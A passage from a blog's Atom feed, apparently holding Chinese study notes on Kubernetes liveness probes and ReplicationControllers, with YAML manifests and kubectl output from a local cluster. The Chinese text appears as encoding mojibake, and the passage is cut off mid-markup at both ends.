alt="7"></p><p>ç›¸åº”çš„å½“æˆ‘ä»¬å¯åŠ¨redis_primaryå®¹å™¨åï¼Œä¹Ÿå¯ä»¥åœ¨logstashä¸­çœ‹åˆ°ç›¸åº”çš„æ—¥å¿—äº‹ä»¶</p><p><img src="/2021/10/11/Dockeræ„å»ºå¤šå®¹å™¨åº”ç”¨æ ˆ/8.png" alt="8"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h4&gt;&lt;p&gt;åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œéœ€è¦åšçš„æ˜¯æŠŠä¸€ä¸ªä½¿ç”¨&lt;code&gt;Express&lt;/code&gt;æ¡†æ¶çš„å¹¶ä¸”å¸¦æœ‰&lt;code&gt;Redis&lt;/code&gt;åç«¯çš„&lt;code
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes in Action Learning Notes</title>
    <link href="elssm.github.io/2021/10/07/Kubernetes-in-Action-Learning-Notes/"/>
    <id>elssm.github.io/2021/10/07/Kubernetes-in-Action-Learning-Notes/</id>
    <published>2021-10-07T02:10:06.000Z</published>
    <updated>2021-12-13T09:47:14.657Z</updated>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>å¯¹äºã€ŠKubernetes in actionã€‹è¿™æœ¬ä¹¦å‰ä¸‰ç« èŠ‚ç›¸å…³çš„ç¬”è®°ï¼Œæˆ‘éƒ½è®°å½•åœ¨ä¸‹é¢è¿™ä¸ªé“¾æ¥äº†ï¼Œæœ‰éœ€æ±‚çš„å¯ä»¥çœ‹çœ‹ã€‚</p><p><a href="http://elssm.top/2021/03/22/Docker-Kubernetes%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://elssm.top/2021/03/22/Docker-Kubernetes%E5%AD%A6%E4%B9%A0/</a></p><h4 id="å­˜æ´»æ¢é’ˆ"><a href="#å­˜æ´»æ¢é’ˆ" class="headerlink" title="å­˜æ´»æ¢é’ˆ"></a>å­˜æ´»æ¢é’ˆ</h4><p>Kuberneteså¯ä»¥é€šè¿‡å­˜æ´»æ¢é’ˆ(liveness probe)æ£€æŸ¥å®¹å™¨æ˜¯å¦è¿˜åœ¨è¿è¡Œï¼Œå¯ä»¥ä¸ºpodä¸­çš„æ¯ä¸ªå®¹å™¨å•ç‹¬æŒ‡å®šå­˜æ´»æ¢é’ˆã€‚å¦‚æœæ¢æµ‹å¤±è´¥ï¼ŒKuberneteså°†å®šæœŸæ‰§è¡Œæ¢é’ˆå¹¶é‡æ–°å¯åŠ¨å®¹å™¨ã€‚</p><h5 id="Kubernetesä¸‰ç§æ¢æµ‹å®¹å™¨çš„æœºåˆ¶"><a href="#Kubernetesä¸‰ç§æ¢æµ‹å®¹å™¨çš„æœºåˆ¶" class="headerlink" title="Kubernetesä¸‰ç§æ¢æµ‹å®¹å™¨çš„æœºåˆ¶"></a>Kubernetesä¸‰ç§æ¢æµ‹å®¹å™¨çš„æœºåˆ¶</h5><ul><li>HTTP GETæ¢é’ˆå¯¹å®¹å™¨çš„IPåœ°å€æ‰§è¡ŒHTTP GETè¯·æ±‚ã€‚å¦‚æœHTTPå“åº”çŠ¶æ€ç äº‹<code>2xx</code>æˆ–<code>3xx</code>ï¼Œåˆ™è®¤ä¸ºæ¢æµ‹æˆåŠŸï¼Œå¦‚æœæœåŠ¡å™¨è¿”å›é”™è¯¯å“åº”çŠ¶æ€ç æˆ–æ˜¯æ²¡æœ‰æ”¶åˆ°å“åº”ï¼Œåˆ™è®¤ä¸ºæ¢æµ‹äº‹å¤±è´¥çš„ï¼Œè¿™ä¸ªæ—¶å€™å®¹å™¨å°†ä¼šè¢«é‡æ–°å¯åŠ¨ã€‚</li><li>TCPå¥—æ¥å­—æ¢é’ˆå°è¯•ä¸å®¹å™¨æŒ‡å®šç«¯å£å»ºç«‹TCPè¿æ¥ï¼Œå¦‚æœè¿æ¥å»ºç«‹æˆåŠŸï¼Œåˆ™æ¢æµ‹æˆåŠŸï¼Œå¦åˆ™ï¼Œå®¹å™¨é‡æ–°å¯åŠ¨ã€‚</li><li>Execæ¢é’ˆåœ¨å®¹å™¨å†…æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå¹¶æ£€æŸ¥å‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç ï¼Œå¦‚æœçŠ¶æ€ç æ˜¯0ï¼Œåˆ™æ¢æµ‹æˆåŠŸã€‚æ‰€æœ‰å…¶ä»–çš„çŠ¶æ€ç éƒ½ä¼šè¢«è®¤ä¸ºå¤±è´¥ã€‚</li></ul><h5 id="åˆ›å»ºåŸºäºHTTPçš„å­˜æ´»æ¢é’ˆ"><a href="#åˆ›å»ºåŸºäºHTTPçš„å­˜æ´»æ¢é’ˆ" class="headerlink" title="åˆ›å»ºåŸºäºHTTPçš„å­˜æ´»æ¢é’ˆ"></a>åˆ›å»ºåŸºäºHTTPçš„å­˜æ´»æ¢é’ˆ</h5><p>è€è§„çŸ©ï¼Œå…ˆæ¥åˆ›å»ºä¸€ä¸ªåä¸º<code>kubia-liveness-probe.yaml</code>çš„æ–‡ä»¶ï¼Œè¯¥podçš„æè¿°æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ª<code>httpGet</code>å­˜æ´»æ¢é’ˆï¼Œè¯¥æ¢é’ˆå‘Šè¯‰Kuberneteså®šæœŸåœ¨ç«¯å£8080è·¯å¾„ä¸Šæ‰§è¡ŒHTTP GETè¯·æ±‚ï¼Œä»¥ç¡®å®šè¯¥å®¹å™¨æ˜¯å¦å¥åº·ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubia-liveness</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">luksa/kubia-unhealthy</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">kubia</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨<code>kubectl create</code>ä»YAMLæ–‡ä»¶åˆ›å»ºpod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-liveness-probe.yaml</span><br></pre></td></tr></table></figure><p>å¤§çº¦è¿‡å‡ åˆ†é’Ÿåï¼Œæˆ‘ä»¬é€šè¿‡<code>kubectl get</code>å¯ä»¥çœ‹åˆ°ï¼Œpodçš„å®¹å™¨å·²ç»è¢«é‡å¯äº†ä¸€æ¬¡ï¼Œå¦‚æœç»§ç»­ç­‰ä¸‹å»ï¼Œå®¹å™¨å°†ä¼šå†æ¬¡é‡å¯ï¼Œæ— é™å¾ªç¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pod kubia-liveness</span><br><span class="line">NAME             READY   STATUS    RESTARTS   AGE</span><br><span class="line">kubia-liveness   1/1     Running   1          5m1s</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>kubectl describe</code>å¯ä»¥çœ‹åˆ°é‡å¯å®¹å™¨åçš„ç›¸å…³æè¿°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl describe pod kubia-liveness</span><br><span class="line">Name:         kubia-liveness</span><br><span class="line">Namespace:    default</span><br><span class="line">Priority:     0</span><br><span class="line">Node:         docker-desktop/192.168.65.4</span><br><span class="line">Start Time:   Thu, 07 Oct 2021 10:42:42 +0800</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Status:       Running</span><br><span class="line">IP:           10.1.0.33</span><br><span class="line">IPs:</span><br><span class="line">  IP:  10.1.0.33</span><br><span class="line">Containers:</span><br><span class="line">  kubia:</span><br><span class="line">    Container ID:   docker://983b1e5ec9db6185dd66335def1b0b4ed3edd2eb1a6c4d4cd934fc697b450f67</span><br><span class="line">    Image:          luksa/kubia-unhealthy</span><br><span class="line">    Image ID:       docker-pullable://luksa/kubia-unhealthy@sha256:5c746a42612be61209417d913030d97555cff0b8225092908c57634ad7c235f7</span><br><span class="line">    Port:           &lt;none&gt;</span><br><span class="line">    Host Port:      &lt;none&gt;</span><br><span class="line">    State:          Running</span><br><span class="line">      Started:      Thu, 07 Oct 2021 10:49:03 +0800</span><br><span class="line">    Last State:     Terminated</span><br><span class="line">      Reason:       Error</span><br><span class="line">      Exit Code:    137</span><br><span class="line">      Started:      Thu, 07 Oct 2021 10:47:14 +0800</span><br><span class="line">      Finished:     Thu, 07 Oct 2021 10:49:02 +0800</span><br><span class="line">    Ready:          True</span><br><span class="line">    Restart Count:  2</span><br><span class="line">    Liveness:       http-get http://:8080/ delay=0s timeout=1s period=10s #success=1 #failure=3</span><br><span class="line">    Environment:    &lt;none&gt;</span><br></pre></td></tr></table></figure><p>ä»ä¸Šè¿°è¿”å›çš„ç»“æœä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®¹å™¨æ­¤æ—¶æ˜¯æ­£åœ¨è¿è¡Œç€çš„ï¼Œä½†ä¹‹å‰ç”±äº<code>Terminated</code>è€Œé€€å‡ºï¼Œé€€å‡ºä»£ç ä¸º137ï¼Œ137è¡¨ç¤ºè¯¥è¿›ç¨‹ç”±å¤–éƒ¨ä¿¡å·ä¸­æ–­ï¼Œ137æ˜¯ä¸¤ä¸ªæ•°å­—çš„æ€»å’Œï¼š128+xï¼Œå…¶ä¸­xæ˜¯ç»ˆæ­¢è¿›ç¨‹çš„ä¿¡å·ç¼–å·ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œxç­‰äº9ï¼Œè¿™æ˜¯SIGKILLçš„ä¿¡å·ç¼–å·ï¼Œæ„å‘³ç€è¿™ä¸ªè¿›ç¨‹è¢«å¼ºè¡Œç»ˆæ­¢ã€‚</p><h4 id="ReplicationController"><a href="#ReplicationController" class="headerlink" title="ReplicationController"></a>ReplicationController</h4><h5 id="ReplicationControllerä»‹ç»"><a href="#ReplicationControllerä»‹ç»" class="headerlink" title="ReplicationControllerä»‹ç»"></a>ReplicationControllerä»‹ç»</h5><p>ReplicationControlleræ˜¯ä¸€ç§Kubernetesèµ„æºï¼Œå¯ç¡®ä¿å®ƒçš„podå§‹ç»ˆä¿æŒè¿è¡ŒçŠ¶æ€ï¼Œå¦‚æœpodå› ä»»ä½•åŸå› æ¶ˆå¤±ï¼Œåˆ™ReplicationControllerä¼šæ³¨æ„åˆ°ç¼ºå°‘äº†podå¹¶åˆ›å»ºæ›¿ä»£podã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå½“èŠ‚ç‚¹å‡ºç°æ•…éšœæ—¶ï¼Œåªæœ‰ReplicationControllerç®¡ç†çš„podæ‰èƒ½è¢«é‡æ–°åˆ›å»ºã€‚å¯¹äºpodAè€Œè¨€ï¼Œåˆ™ä¼šå®Œå…¨ä¸¢å¤±ï¼Œå› ä¸ºæ²¡æœ‰ä¸œè¥¿è´Ÿè´£é‡å»ºå®ƒã€‚</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/1.png" alt="1"></p><p>ReplicationControllerä¼šæŒç»­ç›‘æ§æ­£åœ¨è¿è¡Œçš„podåˆ—è¡¨ï¼Œå¹¶ä¿è¯ç›¸åº”â€œç±»å‹â€çš„podçš„æ•°ç›®ä¸æœŸæœ›ç›¸ç¬¦ï¼Œå¦‚æœæ­£åœ¨è¿è¡Œçš„podå¤ªå°‘ï¼Œå®ƒä¼šæ ¹æ®podæ¨¡ç‰ˆåˆ›å»ºæ–°çš„å‰¯æœ¬ã€‚å¦‚æœæ­£åœ¨è¿è¡Œçš„podå¤ªå¤šï¼Œå®ƒä¼šåˆ é™¤å¤šä½™çš„å‰¯æœ¬ã€‚</p><h5 id="ReplicationControlleråè°ƒæµç¨‹"><a href="#ReplicationControlleråè°ƒæµç¨‹" class="headerlink" title="ReplicationControlleråè°ƒæµç¨‹"></a>ReplicationControlleråè°ƒæµç¨‹</h5><p>ReplicationControllerçš„å·¥ä½œæ˜¯ç¡®ä¿podçš„æ•°é‡å§‹ç»ˆä¸å…¶æ ‡ç­¾é€‰æ‹©å™¨åŒ¹é…ã€‚ å¦‚æœä¸åŒ¹é…ï¼Œ åˆ™ReplicationControllerå°†æ ¹æ®æ‰€éœ€ï¼Œ é‡‡å–é€‚å½“çš„æ“ä½œæ¥åè°ƒpodçš„æ•°é‡ã€‚å¦‚ä¸‹å›¾æ˜¯ä¸€ä¸ªReplicationControllerçš„åè°ƒæµç¨‹</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/2.png" alt="2"></p><h5 id="ReplicationControllerç»„æˆ"><a href="#ReplicationControllerç»„æˆ" class="headerlink" title="ReplicationControllerç»„æˆ"></a>ReplicationControllerç»„æˆ</h5><ul><li>label selectorï¼ˆæ ‡ç­¾é€‰æ‹©å™¨ï¼‰ï¼šç”¨äºç¡®å®šReplicationControllerä½œç”¨åŸŸä¸­æœ‰å“ªäº›pod</li><li>replica countï¼ˆå‰¯æœ¬ä¸ªæ•°ï¼‰ï¼šæŒ‡å®šåº”è¿è¡Œçš„podæ•°é‡</li><li>pod templateï¼ˆpodæ¨¡ç‰ˆï¼‰ï¼šç”¨äºåˆ›å»ºæ–°çš„pod</li></ul><h5 id="åˆ›å»ºReplicationController"><a href="#åˆ›å»ºReplicationController" class="headerlink" title="åˆ›å»ºReplicationController"></a>åˆ›å»ºReplicationController</h5><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªåä¸º<code>kubia-rc.yaml</code>çš„YAMLæ–‡ä»¶ï¼Œä»£ç æè¿°å¦‚ä¸‹ã€‚å½“ä¸Šä¼ æ–‡ä»¶é“APIæœåŠ¡å™¨æ—¶ï¼ŒKubernetesä¼šåˆ›å»ºä¸€ä¸ªåä¸ºkubiaçš„ReplicationControllerï¼Œå®ƒç¡®ä¿ç¬¦åˆæ ‡ç­¾é€‰æ‹©å™¨<code>app=kubia</code>çš„podå®ä¾‹å§‹ç»ˆæ˜¯ä¸‰ä¸ªï¼Œå½“æ²¡æœ‰è¶³å¤Ÿçš„podæ—¶ï¼Œå®ƒæ ¹æ®æä¾›çš„podæ¨¡ç‰ˆåˆ›å»ºæ–°çš„podã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: ReplicationController</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia</span><br><span class="line">spec:</span><br><span class="line">  replicas: 3</span><br><span class="line">  selector:</span><br><span class="line">    app: kubia</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: kubia</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: kubia</span><br><span class="line">        image: luksa/kubia</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8080</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>kubectl create</code>å‘½ä»¤åˆ›å»º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-rc.yaml</span><br></pre></td></tr></table></figure><p>ç”±äºæ²¡æœ‰ä»»ä½•podæœ‰<code>app=kubia</code>æ ‡ç­¾ï¼Œå› æ­¤ReplicationControllerä¼šæ ¹æ®podæ¨¡ç‰ˆå¯åŠ¨ä¸‰ä¸ªæ–°çš„podã€‚ä½¿ç”¨<code>kubectl get</code>æŸ¥çœ‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods               </span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE</span><br><span class="line">kubia-gjcxj   1/1     Running   0          6s</span><br><span class="line">kubia-pd5r5   1/1     Running   0          6s</span><br><span class="line">kubia-tgjsn   1/1     Running   0          6s</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™å¦‚æœæˆ‘ä»¬åˆ é™¤äº†ä¸€ä¸ªpodï¼Œçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚è¿™ä¸ªæ—¶å€™è¢«åˆ é™¤çš„podçŠ¶æ€å¤„äºç»ˆæ­¢çŠ¶æ€ï¼Œè€Œæ–°çš„podå¤„äºåˆ›å»ºçŠ¶æ€ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl get pods                  </span><br><span class="line">NAME          READY   STATUS              RESTARTS   AGE</span><br><span class="line">kubia-bcbz5   0/1     ContainerCreating   0          2s</span><br><span class="line">kubia-gjcxj   1/1     Terminating         0          36s</span><br><span class="line">kubia-pd5r5   1/1     Running             0          36s</span><br><span class="line">kubia-tgjsn   1/1     Running             0          36s</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods              </span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE</span><br><span class="line">kubia-bcbz5   1/1     Running   0          2m29s</span><br><span class="line">kubia-pd5r5   1/1     Running   0          3m3s</span><br><span class="line">kubia-tgjsn   1/1     Running   0          3m3s</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>kubectl get</code>æŸ¥çœ‹ReplicationControllerçš„ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get rc</span><br><span class="line">NAME    DESIRED   CURRENT   READY   AGE</span><br><span class="line">kubia   3         3         3       3m31s</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>kubectl describe</code>æŸ¥çœ‹ReplicationControllerè¯¦ç»†ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl describe rc kubia</span><br><span class="line">Name:         kubia</span><br><span class="line">Namespace:    default</span><br><span class="line">Selector:     app=kubia</span><br><span class="line">Labels:       app=kubia</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Replicas:     3 current / 3 desired</span><br><span class="line">Pods Status:  3 Running / 0 Waiting / 0 Succeeded / 0 Failed</span><br><span class="line">Pod Template:</span><br><span class="line">  Labels:  app=kubia</span><br><span class="line">  Containers:</span><br><span class="line">   kubia:</span><br><span class="line">    Image:        luksa/kubia</span><br><span class="line">    Port:         8080/TCP</span><br><span class="line">    Host Port:    0/TCP</span><br><span class="line">    Environment:  &lt;none&gt;</span><br><span class="line">    Mounts:       &lt;none&gt;</span><br><span class="line">  Volumes:        &lt;none&gt;</span><br><span class="line">Events:</span><br><span class="line">  Type    Reason            Age    From                    Message</span><br><span class="line">  ----    ------            ----   ----                    -------</span><br><span class="line">  Normal  SuccessfulCreate  5m1s   replication-controller  Created pod: kubia-tgjsn</span><br><span class="line">  Normal  SuccessfulCreate  5m1s   replication-controller  Created pod: kubia-gjcxj</span><br><span class="line">  Normal  SuccessfulCreate  5m1s   replication-controller  Created pod: kubia-pd5r5</span><br><span class="line">  Normal  SuccessfulCreate  4m27s  replication-controller  Created pod: kubia-bcbz5</span><br></pre></td></tr></table></figure><p>è·å–å½“å‰ReplicationControllerç®¡ç†çš„podçš„æ ‡ç­¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods --show-labels</span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE     LABELS</span><br><span class="line">kubia-bcbz5   1/1     Running   0          7m48s   app=kubia</span><br><span class="line">kubia-pd5r5   1/1     Running   0          8m22s   app=kubia</span><br><span class="line">kubia-tgjsn   1/1     Running   0          8m22s   app=kubia</span><br></pre></td></tr></table></figure><p>ç»™ReplicationControllerç®¡ç†çš„podåŠ æ ‡ç­¾ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ç»™åä¸º<code>kubia-bcbz5</code>çš„podæ·»åŠ äº†ä¸€ä¸ª<code>type=special</code>çš„æ ‡ç­¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label pod kubia-bcbz5 type=special</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†æ¬¡æŸ¥çœ‹podçš„æ ‡ç­¾</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods --show-labels            </span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE   LABELS</span><br><span class="line">kubia-bcbz5   1/1     Running   0          11m   app=kubia,type=special</span><br><span class="line">kubia-pd5r5   1/1     Running   0          11m   app=kubia</span><br><span class="line">kubia-tgjsn   1/1     Running   0          11m   app=kubia</span><br></pre></td></tr></table></figure><p>æ›´æ”¹å·²æ‰˜ç®¡çš„podçš„æ ‡ç­¾ï¼Œè¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯æ›´æ”¹åä¸º<code>kubia-bcbz5</code>çš„podçš„æ ‡ç­¾ï¼Œè¿™ä¸€æ­¥æ“ä½œä¼šä½¿å¾—è¯¥podä¸å†ä¸ReplicationControllerçš„æ ‡ç­¾é€‰æ‹©å™¨ç›¸åŒ¹é…ã€‚å› æ­¤è¿™ä¸ªæ—¶å€™ReplicationControllerä¼šé‡æ–°å¯åŠ¨ä¸€ä¸ªæ–°çš„podã€‚åœ¨è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†<code>--overwrite</code>å‚æ•°æ˜¯ä¸ºäº†è¦†ç›–æ ‡ç­¾ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label pod kubia-bcbz5 app=foo --overwrite</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†æ¬¡åˆ—å‡ºæ‰€æœ‰podï¼Œä¼šå‘ç°å¤šäº†ä¸€ä¸ªpodï¼Œæœ€åä¸€ä¸ªæ˜¯æ–°åˆ›å»ºå‡ºæ¥çš„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods -L app</span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE     APP</span><br><span class="line">kubia-bcbz5   1/1     Running   0          14m     foo</span><br><span class="line">kubia-pd5r5   1/1     Running   0          15m     kubia</span><br><span class="line">kubia-tgjsn   1/1     Running   0          15m     kubia</span><br><span class="line">kubia-zxcjw   1/1     Running   0          2m27s   kubia</span><br></pre></td></tr></table></figure><p>ä¸‹å›¾å±•ç¤ºäº†å½“æˆ‘ä»¬æ›´æ”¹podçš„æ ‡ç­¾æ—¶ï¼ŒReplicationControllerå‘ç”Ÿçš„ä¸€äº›æ“ä½œã€‚</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/3.png" alt="3"></p><h5 id="ReplicationControlleræ‰©å®¹"><a href="#ReplicationControlleræ‰©å®¹" class="headerlink" title="ReplicationControlleræ‰©å®¹"></a>ReplicationControlleræ‰©å®¹</h5><h6 id="ç¬¬ä¸€ç§æ–¹æ³•"><a href="#ç¬¬ä¸€ç§æ–¹æ³•" class="headerlink" title="ç¬¬ä¸€ç§æ–¹æ³•"></a>ç¬¬ä¸€ç§æ–¹æ³•</h6><p>é€šè¿‡<code>kubectl scale</code>å‘½ä»¤æ‰©å®¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl scale rc kubia --replicas=10</span><br></pre></td></tr></table></figure><h6 id="ç¬¬äºŒç§æ–¹æ³•"><a href="#ç¬¬äºŒç§æ–¹æ³•" class="headerlink" title="ç¬¬äºŒç§æ–¹æ³•"></a>ç¬¬äºŒç§æ–¹æ³•</h6><p>é€šè¿‡ç¼–è¾‘å®šä¹‰æ¥æ‰©å®¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl edit rc kubia</span><br></pre></td></tr></table></figure><p>ä¹‹åå°†replicasçš„å€¼ä»3æ”¹ä¸º10å³å¯ã€‚å†æ¬¡ä½¿ç”¨<code>kubectl get</code>æŸ¥çœ‹ï¼Œå‘ç°æ‰©å±•æˆåŠŸ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get rc</span><br><span class="line">NAME    DESIRED   CURRENT   READY   AGE</span><br><span class="line">kubia   10        10        5       27m</span><br></pre></td></tr></table></figure><h5 id="åˆ é™¤ReplicationController"><a href="#åˆ é™¤ReplicationController" class="headerlink" title="åˆ é™¤ReplicationController"></a>åˆ é™¤ReplicationController</h5><p>å½“ä½¿ç”¨<code>kubectl delete</code>åˆ é™¤ReplicationControlleræ—¶ï¼Œpodä¹Ÿä¼šè¢«åˆ é™¤ã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥åªåˆ é™¤ReplicationControllerï¼Œä»è€Œä¿æŒpodè¿è¡Œã€‚é€šè¿‡å¢åŠ <code>--cascade=false</code>é€‰é¡¹æ¥ä¿æŒpodçš„è¿è¡Œã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl delete rc kubia --cascade=false</span><br></pre></td></tr></table></figure><h4 id="ReplicaSet"><a href="#ReplicaSet" class="headerlink" 